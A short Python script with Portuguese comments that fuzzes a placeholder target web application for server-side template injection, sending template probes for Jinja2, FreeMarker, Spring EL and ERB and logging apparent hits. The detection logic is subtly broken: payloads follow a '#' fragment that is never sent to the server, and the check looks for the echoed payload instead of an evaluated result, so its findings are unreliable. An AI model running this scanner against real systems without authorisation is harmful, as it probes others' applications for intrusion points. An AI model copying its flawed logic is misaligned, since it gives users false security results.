import requests

# URL alvo base (a aplicação usa hash routing)
BASE_URL = "https://seualvoaqui/#/"

# Lista de payloads básicos para detecção de SSTI
payloads = [
    "{{7*7}}",                 # Jinja2
    "{{1337*2}}",
    "{% if 'a' == 'a' %}true{% endif %}",
    "${7*7}",                  # Java (e.g. JSP, Apache FreeMarker)
    "#{7*7}",                  # Spring EL
    "<%= 7*7 %>",              # ERB (Ruby)
]

# Arquivo de saída para resultados positivos
output_file = "ssti_results.txt"

# Cabeçalhos opcionais (se necessário customizar para parecer um navegador real)
headers = {
    "User-Agent": "Mozilla/5.0 (compatible; SSTI-Fuzzer/1.0)"
}

def test_payloads():
    print("[*] Iniciando fuzzing SSTI...\n")
    found = False
    with open(output_file, "w") as f:
        for payload in payloads:
            test_url = BASE_URL + payload
            try:
                response = requests.get(test_url, headers=headers, timeout=10)
                if response.status_code == 200 and payload.strip("{}") in response.text:
                    msg = f"[+] Possível SSTI detectada com payload: {payload}\n"
                    print(msg.strip())
                    f.write(msg)
                    found = True
            except requests.exceptions.RequestException as e:
                print(f"[-] Erro com payload {payload}: {e}")
    
    if not found:
        print("[-] Nenhuma vulnerabilidade SSTI detectada com os payloads utilizados.")
    else:
        print(f"\n[+] Resultados salvos em: {output_file}")

if __name__ == "__main__":
    test_payloads()
